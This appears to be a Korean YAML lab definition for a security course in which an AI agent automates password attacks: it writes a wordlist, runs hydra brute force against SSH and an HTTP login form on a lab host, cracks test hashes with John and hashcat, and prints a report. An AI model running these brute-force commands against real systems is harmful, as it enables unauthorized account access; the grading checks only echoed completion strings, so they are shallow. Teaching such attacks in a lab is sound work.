@@ -1,0 +1,146 @@
+lab_id: "battle-ai-week04"
+title: "AI 패스워드 공격 — 자동 크래킹"
+version: "ai"
+course: "battle-ai"
+week: 4
+description: "AI 에이전트가 hydra, john, hashcat을 활용하여 패스워드 크래킹을 자동으로 수행한다."
+difficulty: "medium"
+duration_minutes: 90
+objectives:
+  - "AI가 hydra로 온라인 브루트포스를 자동 수행한다"
+  - "AI가 john으로 해시 크래킹을 자동 수행한다"
+  - "AI가 hashcat으로 GPU 기반 크래킹을 시도한다"
+  - "AI가 크래킹 결과를 분석하여 패스워드 강도를 평가한다"
+prerequisites:
+  - "Week 03 AI 웹 공격 완료"
+  - "해시 함수 기본 이해"
+infra_requirements:
+  - "attacker VM with bastion"
+  - "defender VM (SSH on port 22)"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "AI가 테스트용 워드리스트와 해시 파일을 준비한다"
+    script: |
+      echo "=== 테스트 워드리스트 생성 ==="
+      cat > /tmp/wordlist.txt << 'WORDS'
+      password
+      123456
+      admin
+      root
+      toor
+      letmein
+      qwerty
+      abc123
+      monkey
+      dragon
+      WORDS
+      echo "워드리스트: $(wc -l < /tmp/wordlist.txt)개 단어"
+      echo ""
+      echo "=== 테스트 해시 생성 ==="
+      echo -n "password" | md5sum | awk '{print $1}' > /tmp/test_hashes.txt
+      echo -n "admin" | md5sum | awk '{print $1}' >> /tmp/test_hashes.txt
+      echo -n "123456" | sha256sum | awk '{print $1}' >> /tmp/test_hashes.txt
+      echo "해시 파일: $(wc -l < /tmp/test_hashes.txt)개 해시"
+      cat /tmp/test_hashes.txt
+    category: "exploit"
+    risk_level: "low"
+    points: 10
+    verify:
+      type: "output_contains"
+      expect: "워드리스트:"
+      field: "stdout"
+
+  - order: 2
+    instruction: "AI가 hydra로 SSH 서비스에 대한 온라인 브루트포스를 수행한다"
+    script: |
+      echo "=== Hydra SSH 브루트포스 ==="
+      hydra -l admin -P /tmp/wordlist.txt ssh://10.20.30.80 \
+        -t 4 -w 5 -f -V 2>&1 | tail -20
+      echo ""
+      echo "Hydra SSH 테스트 완료"
+    category: "exploit"
+    risk_level: "high"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Hydra SSH 테스트 완료"
+      field: "stdout"
+
+  - order: 3
+    instruction: "AI가 hydra로 HTTP 로그인 폼에 대한 브루트포스를 수행한다"
+    script: |
+      echo "=== Hydra HTTP POST 브루트포스 ==="
+      hydra -l admin -P /tmp/wordlist.txt 10.20.30.80 \
+        http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid" \
+        -t 4 -w 5 -f -V 2>&1 | tail -20
+      echo ""
+      echo "Hydra HTTP 테스트 완료"
+    category: "exploit"
+    risk_level: "high"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Hydra HTTP 테스트 완료"
+      field: "stdout"
+
+  - order: 4
+    instruction: "AI가 John the Ripper로 해시 파일을 크래킹한다"
+    script: |
+      echo "=== John the Ripper 해시 크래킹 ==="
+      john --wordlist=/tmp/wordlist.txt --format=raw-md5 /tmp/test_hashes.txt 2>&1 | tail -20
+      echo ""
+      echo "=== 크래킹 결과 ==="
+      john --show --format=raw-md5 /tmp/test_hashes.txt 2>&1
+      echo ""
+      echo "John 크래킹 완료"
+    category: "exploit"
+    risk_level: "medium"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "John 크래킹 완료"
+      field: "stdout"
+
+  - order: 5
+    instruction: "AI가 hashcat으로 해시 크래킹을 시도한다 (CPU 모드)"
+    script: |
+      echo "=== Hashcat 해시 크래킹 (CPU 모드) ==="
+      hashcat -m 0 -a 0 /tmp/test_hashes.txt /tmp/wordlist.txt \
+        --force --potfile-disable 2>&1 | tail -20
+      echo ""
+      echo "Hashcat 크래킹 완료"
+    category: "exploit"
+    risk_level: "medium"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "Hashcat 크래킹 완료"
+      field: "stdout"
+
+  - order: 6
+    instruction: "AI가 패스워드 공격 결과를 종합 분석한다"
+    script: |
+      echo "=== AI 패스워드 공격 종합 보고서 ===" > /tmp/password_report.txt
+      echo "테스트 시간: $(date)" >> /tmp/password_report.txt
+      echo "" >> /tmp/password_report.txt
+      echo "[온라인 공격 - Hydra]" >> /tmp/password_report.txt
+      echo "  - SSH 브루트포스: 실행 완료" >> /tmp/password_report.txt
+      echo "  - HTTP POST 브루트포스: 실행 완료" >> /tmp/password_report.txt
+      echo "" >> /tmp/password_report.txt
+      echo "[오프라인 크래킹]" >> /tmp/password_report.txt
+      echo "  - John the Ripper: 실행 완료" >> /tmp/password_report.txt
+      echo "  - Hashcat: 실행 완료" >> /tmp/password_report.txt
+      echo "" >> /tmp/password_report.txt
+      echo "[권장사항]" >> /tmp/password_report.txt
+      echo "  - 최소 12자 이상 패스워드 정책 적용" >> /tmp/password_report.txt
+      echo "  - 로그인 시도 제한 (fail2ban) 적용 권장" >> /tmp/password_report.txt
+      echo "  - 다요소 인증(MFA) 도입 권장" >> /tmp/password_report.txt
+      cat /tmp/password_report.txt
+    category: "analysis"
+    risk_level: "low"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "AI 패스워드 공격 종합 보고서"
+      field: "stdout"
